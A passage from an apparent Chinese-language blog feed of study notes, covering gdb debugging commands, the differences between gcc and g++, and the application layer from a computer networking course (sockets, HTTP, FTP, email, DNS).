class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置某一个或者某几个断点无效</span></span><br><span class="line">(gdb) dis 断点1的编号 [断点2的编号 ...]</span><br><span class="line">(gdb) disable 2 3 5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置某个区间断点无效</span></span><br><span class="line">(gdb) dis 断点1编号-断点n编号</span><br><span class="line">(gdb) disable 3-5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置某一个或者某几个断点有效</span></span><br><span class="line">(gdb) ena 断点1的编号 [断点2的编号 ...]</span><br><span class="line">(gdb) enable 2 3 5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置某个区间断点有效</span></span><br><span class="line">(gdb) ena 断点1编号-断点n编号</span><br><span class="line">(gdb) enable 3-5</span><br></pre></td></tr></table></figure><hr><ul><li><code>continue</code>，缩写为<code>c</code>，让程序从当前断点处继续运行下去，直到遇到下一个有效的断点。与<code>run</code>命令不同的是，这是程序进入执行状态之后用的命令。</li><li><code>print</code>，缩写为<code>p</code>，用<code>/fmt</code>指定要输出的变量的格式</li></ul><table><thead><tr><th align="center">格式化字符(&#x2F;fmt)</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>/x</code></td><td align="center">以十六进制的形式打印出整数。</td></tr><tr><td align="center"><code>/d</code></td><td align="center">以有符号、十进制的形式打印出整数。</td></tr><tr><td align="center"><code>/u</code></td><td align="center">以无符号、十进制的形式打印出整数。</td></tr><tr><td align="center"><code>/o</code></td><td align="center">以八进制的形式打印出整数。</td></tr><tr><td align="center"><code>/t</code></td><td align="center">以二进制的形式打印出整数。</td></tr><tr><td align="center"><code>/f</code></td><td align="center">以浮点数的形式打印变量或表达式的值。</td></tr><tr><td align="center"><code>/c</code></td><td align="center">以字符形式打印变量或表达式的值。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">print</span> == p</span></span><br><span class="line">(gdb) p 变量名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果变量是一个整形, 默认对应的值是以10进制格式输出, 其他格式请参考上表</span></span><br><span class="line">(gdb) p/fmt 变量名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line">(gdb) p i       # 10进制</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5 = 3</span></span><br><span class="line">(gdb) p/x i     # 16进制</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6 = 0x3</span></span><br><span class="line">(gdb) p/o i     # 8进制</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">7 = 03</span></span><br></pre></td></tr></table></figure><ul><li><code>ptype</code>，用来打印变量的类型</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">语法格式</span></span><br><span class="line">(gdb) ptype 变量名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印变量类型</span></span><br><span class="line">(gdb) ptype i</span><br><span class="line">type = int</span><br><span class="line">(gdb) ptype array[i]</span><br><span class="line">type = int</span><br><span class="line">(gdb) ptype array</span><br><span class="line">type = int [12]</span><br></pre></td></tr></table></figure><ul><li><code>display</code>，没有缩写，在每一次执行一条指令后就会打印变量的值，每个被标记要被打印的变量会被打上编号和相应的属性，和<code>break</code>管理断点一样</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在变量的有效取值范围内, 自动打印变量的值(设置一次, 以后就会自动显示)</span></span><br><span class="line">(gdb) display 变量名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以指定的整形格式打印变量的值, 关于 <span class="built_in">fmt</span> 的取值, 请参考 <span class="built_in">print</span> 命令</span></span><br><span class="line">(gdb) display/fmt 变量名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line">(gdb) display/c i</span><br><span class="line">(gdb) display arr</span><br></pre></td></tr></table></figure><p>同样可以用<code>info</code>命令查看<code>display</code>的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info display</span><br><span class="line">Auto-display expressions now in effect:</span><br><span class="line">Num Enb Expression</span><br><span class="line">1:   y  i</span><br><span class="line">2:   y  array[i]</span><br><span class="line">3:   y  /x array[i]</span><br></pre></td></tr></table></figure><ol><li><code>Num</code> : 变量或表达式的编号，GDB 调试器为每个变量或表达式都分配有唯一的编号</li><li><code>Enb</code> : 表示当前变量（表达式）是处于激活状态还是禁用状态，如果处于激活状态（用 y 表示），则每次程序停止执行，该变量的值都会被打印出来；反之，如果处于禁用状态（用 n 表示），则该变量（表达式）的值不会被打印。</li><li><code>Expression</code> ：被自动打印值的变量或表达式的名字。</li></ol><ul><li><code>undisplay</code>，和删除断点一样，会把我们不想要显示的变量删除掉，不可逆。还可以用<code>delete display</code>来代替</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令中的 num 是通过 info display 得到的编号, 编号可以是一个或者多个</span></span><br><span class="line">(gdb) undisplay num [num1 ...]</span><br><span class="line">(gdb) undisplay 2 3 5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">num1 - numN 表示一个范围</span></span><br><span class="line">(gdb) undisplay num1-numN</span><br><span class="line">(gdb) undisplay 3-5</span><br></pre></td></tr></table></figure><ul><li><code>disable display</code>，如果不想删除只是想让其失效就可以用这个命令，它会修改<code>display</code>管理的变量的<code>Ena</code>属性为<code>n</code></li><li><code>enable display</code>，遇上面对命令相对应，恢复变量的有效性</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令中的 num 是通过 info display 得到的编号, 编号可以是一个或者多个</span></span><br><span class="line">(gdb) disable display num [num1 ...]</span><br><span class="line">(gdb) disable display 2 3 5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">num1 - numN 表示一个范围</span></span><br><span class="line">(gdb) disable display num1-numN</span><br><span class="line">(gdb) disable display 3-5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令中的 num 是通过 info display 得到的编号, 编号可以是一个或者多个</span></span><br><span class="line">(gdb) enable  display num [num1 ...]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">num1 - numN 表示一个范围</span></span><br><span class="line">(gdb) disable display num1-numN</span><br></pre></td></tr></table></figure><hr><p><code>step</code>，缩写为<code>s</code>，单步执行命令，但是遇到函数时会进入函数内部执行，即 <strong>步入(step into)</strong></p><p><code>next</code>，缩写为<code>n</code>，执行指令，但是会跳过函数调用，不会进入函数内部，即 <strong>步过(step over)</strong></p><p><code>finish</code>，进入函数后，如果不想待在函数内就可以使用这个命令执行函数剩下的指令，跳出函数，即 <strong>步出(step out)</strong>。如果想要跳出函数体必须要保证函数体内不能有有效断点，否则无法跳出，会停在函数体内部的下一个断点处。</p><p><code>until</code>，通过 until 命令可以直接跳出某个循环体，这样就能提高调试效率了。如果想直接从循环体中跳出, 必须要满足以下的条件，否则命令不会生效：</p><ol><li>要跳出的循环体内部不能有有效的断点，如果循环体内部有断点可以用<code>disable</code>命令使其失效或者直接<code>delete</code>掉，否则无效。</li><li>必须要在循环体的开始&#x2F;结束行执行该命令，也就是说只有停在<code>for (i = 0; i &lt; len; i++)</code>这个地方才能使用<code>until</code>，否则无效。</li></ol><p><code>set var 变量名=值</code>， 可以直接修改某个变量的值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set var i = 5</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set assembly-flavor intel # 将汇编风格改为intel</span><br><span class="line">disassemble $rip # 反汇编rip所指的地址处</span><br><span class="line">display/2i $rip # 这样可以在每次执行指令后查看当前指令</span><br><span class="line">set $rax=0x61 # 修改寄存器的值</span><br><span class="line">x/20i address # 查看该地址开始的20条指令</span><br><span class="line"># x指令是查看内存的，输入寄存器会去寄存器指向的内存</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gcc和g++的区别</title>
      <link href="/2024/07/10/gcc%E5%92%8Cg++%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2024/07/10/gcc%E5%92%8Cg++%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p><code>GCC</code>，全称<strong>GNU Compile Collection</strong>，也就是一个编译套装。通常来看，<code>gcc</code>是用来编译C的，<code>g++</code>是用来编译C++的。从用法上来看这是没错的，但这种认识是比较片面的。</p><p>需要认识到的第一个原理是，<code>g++</code>最终调用的还是<code>gcc</code>，换句话说，<code>gcc</code>才是最终的编译器。</p><p>接下来从三个方面来讲述两者的区别：</p><ol><li>对待源文件(编译阶段)，<code>gcc</code>对待<code>.c</code>文件将其当作C程序，对待<code>.cpp</code>文件将其当作C++程序；<code>g++</code>对待<code>.c</code>和<code>.cpp</code>文件一律当作C++程序处理</li><li>链接标准库(链接阶段)，<code>gcc</code>默认只会连接到标准C库；<code>g++</code>可以自动连接到标准C库和标准C++库。但是<code>gcc</code>可以用<code>-l</code>参数添加C++标准库，像这样<code>-lstdc++</code>，这样的话<code>gcc</code>也可以编译C++了。</li><li>关于<code>__cpluscplus</code>宏定义。<code>gcc</code>会根据源文件后缀名去判断是否要定义这个宏；<code>g++</code>会直接定义这个宏，但是这并不影响它可以正常编译C程序</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gcc a.cpp -o a</span><br><span class="line">/usr/bin/ld: /tmp/cc6TWnM5.o: warning: relocation against `_ZSt4cout&#x27; in read-only section `.text&#x27;</span><br><span class="line">/usr/bin/ld: /tmp/cc6TWnM5.o: in function `main&#x27;:</span><br><span class="line">a.cpp:(.text+0x11): undefined reference to `std::cout&#x27;</span><br><span class="line">/usr/bin/ld: a.cpp:(.text+0x19): undefined reference to `std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*)&#x27;</span><br><span class="line">/usr/bin/ld: a.cpp:(.text+0x20): undefined reference to `std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::endl&lt;char, std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;)&#x27;</span><br><span class="line">/usr/bin/ld: a.cpp:(.text+0x2b): undefined reference to `std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;))&#x27;</span><br><span class="line">/usr/bin/ld: warning: creating DT_TEXTREL in a PIE</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line"></span><br><span class="line">gcc a.cpp -l stdc++ -o a</span><br><span class="line"></span><br><span class="line">./a</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【中科大计算机网络】应用层</title>
      <link href="/2024/06/22/%E3%80%90%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%91%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2024/06/22/%E3%80%90%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%91%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>从应用程序和应用程序的沟通方式来看，网络应用的架构可以分为一下集中类型：</p><ol><li><strong>客户-服务器模式（C&#x2F;S:client&#x2F;server）</strong></li><li><strong>对等模式（P2P:Peer to Peer）</strong></li><li><strong>混合体：客户-服务器和对等体系结构</strong></li></ol><h3 id="分布式进程通信需要解决的问题"><a href="#分布式进程通信需要解决的问题" class="headerlink" title="分布式进程通信需要解决的问题"></a>分布式进程通信需要解决的问题</h3><ol><li>进程如何标识和寻址问题。怎么样标识自己和其它进程的不同，怎么样让别人找得到你。可以用<code>IP</code>和<code>port</code>来标识一个进程，这样的组合可以表示一个<strong>端节点(end point)</strong>，本质上，一对主机进程之间的通信由2个端节点构成</li><li>应用进程怎么使用传输层所提供的服务。怎么样使用传输层提供的服务的形式和地点。这个问题又可以分为 2 个子问题。<ol><li>从应用进程传递给传输层，需要携带什么信息？<ul><li>要传输的报文(数据),也就是<code>SDU</code></li><li>传给谁，也就是目标进程的<code>IP + port</code></li><li>谁传的，也就是自己的应用进程标识，这样对方发来的响应才能接收到</li></ul></li><li>用什么东西来封装传过去的信息？<code>TCP实体</code>还是<code>UDP实体</code></li></ol></li><li>应用进程之间通过以上两个条件，可以进行报文的交换了，那么该如何定义协议实现通信。</li></ol><p>对于第 2 个问题，还有一个重要的知识点。应用进程之间进行通信的时候，每次从上层传输给下层一些必要信息时，是不是每次的<code>源IP 源port</code> 和 <code>目标IP 目标port</code>都是固定的，似乎只有要传输的报文是不一样的。那么，每次应用进程通过层间接口给比如<code>TCP</code>实体传送必要信息时都会有重复的信息，而且很麻烦。于是，传输层引出了新的概念，并提供了新的服务——<strong>Socket</strong>，说白了<code>Socket</code>其实就是一张表，它就跟<code>文件描述符表</code>一样，通过一个整数（索引）来定位一个结构体信息。这个结构体包含哪些信息呢，最重要的就是<code>源IP 源port</code> 和 <code>目标IP 目标port</code>，以此四元组来维护本地应用进程和目标应用进程之间的通信和连接。然后呢，应用进程可以通过传输层提供的<code>Socket API</code>在<code>Socket</code>中创建自己和目标的连接表项，<code>Socket API</code>会返回这个表项的索引值作为整数，然后应用进程在此之后就可以拿着这个整数与目标进程进行通信，就像<code>文件描述符</code>一样。一个<code>TCP Socket</code>代表的是一对应用进程之间的会话关系，具体的看看下面这张图就行了。注意上面说的都是<code>TCP</code>的<code>Socket</code>。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/00.png" alt="00"></p><p>因为<code>UDP</code>是无连接的服务，所以<code>UDP</code>的<code>Socket</code>整数不代表一个会话关系，<code>UDP</code>的<code>Socket</code>只包含<code>源IP 源port</code> ，是一个二元组。所以应用程序在使用<code>UDP</code>的<code>Socket API</code>时还需要包含<code>目标IP 目标port</code>。<code>UDP</code>的<code>Socket</code>只是本地意义上的标识，仅仅代表本地的一个<code>端节点</code>。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/01.png" alt="01"></p><p>应用和应用实体需要区分，实际上应用除了应用实体之外还包括界面、IO操作、内部的处理逻辑，而实体指的是需网络交互有关的，遵守协议的这部分内容。比如一个 Web 应用，除了<code>HTTP协议</code>之外还包括了<code>HTML</code>的文件解释模块，这个模块并不属于<code>HTTP</code>。实体是实现网络协议的软件模块或者硬件模块，而且是运行当中的软件模块&#x2F;硬件模块啊。</p><h3 id="Web-and-HTTP"><a href="#Web-and-HTTP" class="headerlink" title="Web and HTTP"></a>Web and HTTP</h3><p><code>Web</code>是一种应用，而<code>HTTP</code>是一种支持<code>Web</code>应用的协议</p><p><strong>HTTP</strong>，超文本传输协议，是跑在<code>TCP</code>协议之上的应用层协议。</p><p>现在的<code>HTTP</code>有两个版本，<code>HTTP/1.0</code>和<code>HTTP/1.1</code>版本，它们都是跑在<code>TCP</code>连接上的协议。区别在于一个是非持久连接，另一个是持久连接。非持久连接在一次<code>TCP</code>之上最多只有一个对象在<code>TCP</code>连接上发送，下载多个对象则需要多次<code>TCP</code>连接，因为传送了一次后，应用程序就会发出申请断开连接的请求。持久连接则允许在一次<code>TCP</code>连接之上传输多个对象，它不会在建立连接后马上释放连接。</p><p><code>HTTP/1.1</code>默认是会保持连接的，当然也可以在请求头中添加<code>Connection: close</code>，在接收到对象后直接释放连接。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/02.png" alt="02"></p><p><code>HTTP</code>协议的头部中有一个<code>Content-Length</code>字段，这个字段有什么用呢，它描绘本次报文的大小。因为<code>TCP</code>协议并不维护报文的界限，假如应用程序给了传输层 2 个 15K 大小的报文，通过<code>TCP</code>传输给对方，对方可能会收到 1 个 30K 大小的报文。<code>TCP</code>不维护报文的界限，就需要<code>HTTP</code>协议自己来维护。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/03.png" alt="03"></p><p><code>HTTP</code>协议是<strong>无状态协议</strong>，什么叫无状态协议呢？服务器接收到<code>HTTP请求</code>，解析报文，按要求封装<code>HTTP响应</code>，然后发回去，这样就结束了。下次收到同样的请求，还是做同样的响应，不维护、不记录客户端的状态。因为有些应用需要用到<code>HTTP</code>协议，而且有维护状态的需求，于是有了<strong>Cookie</strong>的概念。在响应中带上<code>Set-Cookie</code>字段，客户端接收到响应后就会在本地存储<code>Cookie</code>，下次再次访问相同的网站时就会带上<code>Cookie</code>，服务器端接收到请求就会根据<code>Cookie</code>在数据库中检索对应的用户信息。</p><p>然后再后面引出了**Proxy(代理服务器)**的概念，这个服务器就是充当<code>Cache</code>的作用，用户访问一个网站，如果在这个服务器中刚好有这个网站的缓存，就直接返回这个缓存，不需要再次连接远端服务器（<code>Origin Server</code>），节省了时间。但是这样又会有个问题，如果远端服务器中的内容更新了怎么办，与代理服务器的内容不一致怎么办？这就给<code>HTTP</code>请求添加了新的请求方式，<strong>条件GET方法</strong>，其实和原来的格式一样，只不过有了新的头部字段：<code>If-modified-since: &lt;date&gt;</code>，用户向网站发出请求，先被代理服务器拦截，代理服务器这时会先向<code>Origin Server</code>发出这个条件请求，如果确实有更新，服务器像正常响应一样返回完整的响应报文，如果有更新，就简单返回一个<code>HTTP/1.0 304 Not  Modified</code>，这样代理服务器就知道了服务器没有更新，返回原来的缓存内容给用户。</p><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>这个协议需要了解的不多。要知道的是这个协议和<code>HTTP</code>协议一样，仍然需要跑在<code>TCP</code>协议之上，而且它是<strong>有状态协议</strong>，因为服务器需要维护当前通信的用户是谁，他当前处在哪个目录上等信息。</p><p>此外还需要了解服务器建立连接的过程。<code>FTP</code>协议的默认端口为 <strong>21</strong></p><p>首先，客户端向服务器的 21 号端口发送连接请求，通过用户认证后正常使用。客户端仍然需要通过向服务器的 21 号端口发送一些控制命令，比如上传和下载命令。假如发送的是下载命令，服务器会<strong>主动</strong>与客户端的 20 号端口建立新的连接，这个连接通道叫做<strong>数据连接</strong>专门用来传输文件。</p><p>所以<code>FTP</code>协议有两个连接通道，一个是控制连接，一个是数据连接。</p><p>需要注意的是，其实<code>HTTP</code>协议也可以上传文件和下载文件</p><h3 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h3><p>什么是应用，比如说Web应用就是运行在服务器上的程序。</p><p>浏览器软件是Web应用的用户代理，用户通过浏览器访问Web应用。ftp客户端软件是ftp应用的用户代理。软件代理用户去访问应用，软件代理用户去执行相应的协议动作。</p><p>用户代理通过<strong>SMTP</strong>协议给邮件服务器发送邮件，通过<strong>POP3、IMAP、HTTP</strong>三种协议都可以从邮件服务器拉取邮件</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/04.png" alt="04"></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p><strong>DNS</strong>，Domain Name System，域名解析系统。<code>IP</code>地址标识主机、路由器，但是它是<code>32</code>位<code>4</code>字节的整数，不方便人类记忆，所以有了<code>DNS</code>负责将用户提供的字符串域名转化为二进制的网络地址。</p><p><code>DNS</code>系统需要解决的问题有以下 3 点：</p><ol><li>如何命名设备<ul><li>要用有意义的字符串便于人类记忆的命名方式</li><li>不能在一个平面上命名，容易重名。这就需要采用层次化命名</li></ul></li><li>如何完成名字到IP地址的解析<ul><li>采用分布式分层式的管理，一块区域由一个或者一层的 DNS 系统来维护和解析</li></ul></li><li>如何维护：增加或者删除一个域，需 要在域名系统中做哪些工作</li></ol><p><code>DNS</code>服务运行在服务器的<code>UDP</code>的 <code>53 </code>号端口上。<code>DNS</code>是互联网的核心功能，但是它是在互联网的边缘系统的应用层上实现的，不是在互联网的核心中实现的。 </p><p>需要区分一下什么是<strong>别名</strong>和<strong>规范名字</strong>。别名就是一个公司面向用户发布的域名比如说<code>www.baidu.com</code>，用户都会通过这个域名取访问百度的服务器，但是百度不可能在我国只设置一个服务器，他会在各个地区各个省份设立当地服务器，这些地方服务器都会有一个特定名字便于百度去管理，这个名字就是规范名字。</p><p>用户通过百度提供的<code>www.baidu.com</code>试图访问百度服务器，浏览器将别名发送给当地的<code>DNS</code>，域名解析系统将这个别名转换为当地的百度服务器的规范名字并返回给浏览器，或者说域名解析系统中一个别名对应了多个不同的规范名字，<code>DNS</code>可以根据当时的情况选择一个合适规范名字返回个浏览器</p><p>浏览器继续将这个规范名字发送给<code>DNS</code>，域名解析系统将这个规范名字转换为<code>IP</code>地址返回给浏览器。浏览器接收<code>IP</code>地址，然后就使用这个<code>IP</code>地址。</p><p><strong>DNS域名结构</strong></p><ul><li><p>一个层面命名设备会有很多重名</p></li><li><p><code>DNS</code>采用层次树状结构的命名方法</p></li><li><p><code>Internet</code>根被划分为几百个顶级域(top level domains)</p><ul><li><p>通用的(generic)</p><p>  <code>.com</code>，<code>.edu</code>，<code>.gov</code>，<code>.int</code>，<code>.mil</code>，<code>.net</code>，<code>.ort</code><br>  <code>.firm</code>，<code>.hsop</code>，<code>.web</code>，<code>.arts</code>，<code>.rec</code>；</p></li><li><p>国家的(countries)</p><p>  <code>.cn</code>，<code>.us</code>，<code>.jp</code>，<code>.nl</code></p></li></ul></li><li><p>每个域下面可划分为若干子域(subdomains)</p></li><li><p>树枝是子域(subdomains)</p></li><li><p>树叶是主机(host)</p></li></ul><p>域的划分与地理位置没有关系。同一个域下的子域可以分布在不同地理位置，同一个地理位置也可以有不同的域。域的划分是逻辑上的划分</p><p><strong>权威DNS服务器</strong>，或者说权威名字服务器，用于管理一个**域(Zone)**的域名。</p><p>为了方便管理，将互联网划分为一个个互不相交的<strong>区域(Zone)</strong>，每个区域都有一个名字服务器，维护着它所管辖区域的权威信息(authoritative record)。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/05.png" alt="05"></p><p><strong>顶级域(TLD)服务器</strong>：负责顶级域名（如com、org、edu和cn、uk、jp等)，由一些公司负责维护这些顶级域名服务器。比如 NetWork solutions公司维护<code>com TLD服务器</code>、Educause公司维护<code>edu TLD服务器</code>。</p><p>那么<code>DNS</code>服务器里存储的都是些什么呢？<code>DNS</code>数据库中存储的一条记录叫做<strong>资源记录(Resource Record)</strong>，这个记录有以下几个字段：</p><ul><li>DomainName：域名</li><li>TTL：Time to Live，生存时间。如果时间无限大说明是权威记录，如果时间小说明是缓冲记录，一般是2天</li><li>Class：记录的类别，如果是互联网类型，则值为 IN</li><li>Value：值，就是DomainName所映射的值</li><li>Type：类型，就是关于DomainName到Value的映射关系，其实表明了Value具体的含义是什么</li></ul><p>关于<code>TTL</code>的设置说明一下。本地有一个权威名字服务器，比如说科大的名字服务器，它如果存储的是科大自己本地的一些主机域名所对应的IP，那么这条记录就是永久的。如果某个用户访问了科大外的服务器，比如说交大的服务器，科大的名字服务器作为代理去询问交大服务器的<code>IP</code>，得到了之后返回给用户，并将此时交大服务器的域名和<code>IP</code>做一个存储以便下一次访问时的返回，但是这是一个缓存，一般 2 天后就会自动删除。为什么要删除呢，一方面是为了节省空间，另一方面如果交大服务器那边的IP地址改了，或者域名改了，这样原来的留着也没意义，还不如删了以便下次更新。</p><p>还有<code>Type</code>的说明。如果<code>Type = A(Address)</code>，那么这条记录就是关于一个主机的**确定(specific)**域名到它<code>IP</code>地址的映射；如果<code>Type = CNAME</code>，那么这条记录就是关于一个别名(公布给用户的名字)到服务器的规范名字（或者说确定域名）的映射；如果<code>Type = NS</code>，那么这条记录就是关于一个域名到该域名服务器的域名（其实就是DNS服务器的域名），其实感觉跟<code>CNAME</code>也差不多，不过应该是为了区分<code>Value</code>服务器的类型吧。还有<code>Type = MX</code>跟上面的解释也差不多。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/06.png" alt="06"></p><p>比如说<code>edu</code>域名服务器 记录 <code>yale.edu</code>域名的有关信息，它需要起码 2 条记录，一条映射是<code>yale.edu</code>到<code>yale.edu</code>域名服务器的确定域名，这条记录的<code>Type = NS</code>；一条是这个确定域名到<code>IP</code>地址的映射，这条记录的<code>Type = A</code></p><p>同样的<code>yale.edu</code>域名服务器记录<code>cs.yale.edu</code>域名的信息也是向上面一样。</p><p>一台主机想要上网一般需要 4 个信息：<code>IP</code>地址、子网掩码、<code>Local Name Server</code>本地域名解析服务器、<code>Default Gateway</code>发送到外网的网关地址。这些信息要么手动配要么自动配。</p><p>一般来说，我们的主机想要获取一个域名对应的<code>IP</code>地址，都会优先向本地的域名解析服务器发送请求，如果本地的域名解析系统有这条记录则直接返回，如果没有就需要进入下一个流程。这个流程有两种方式，不过大抵相同。</p><p>全球有 13 个根服务器，这些服务器记录了顶级域名(像com、edu这一类)有关的映射。</p><p>首先是递归查询，这种方式压力全在根<code>DNS</code>服务器。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/07.png" alt="07"></p><p>因为根服务器的压力太大，就有了迭代查询方式，这样根服务器只需要简单返回一个响应就行了。压力全在本地DNS服务器上。</p><p><img src="/../posts_img/%E4%B8%AD%E7%A7%91%E5%A4%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/chapter2/08.png" 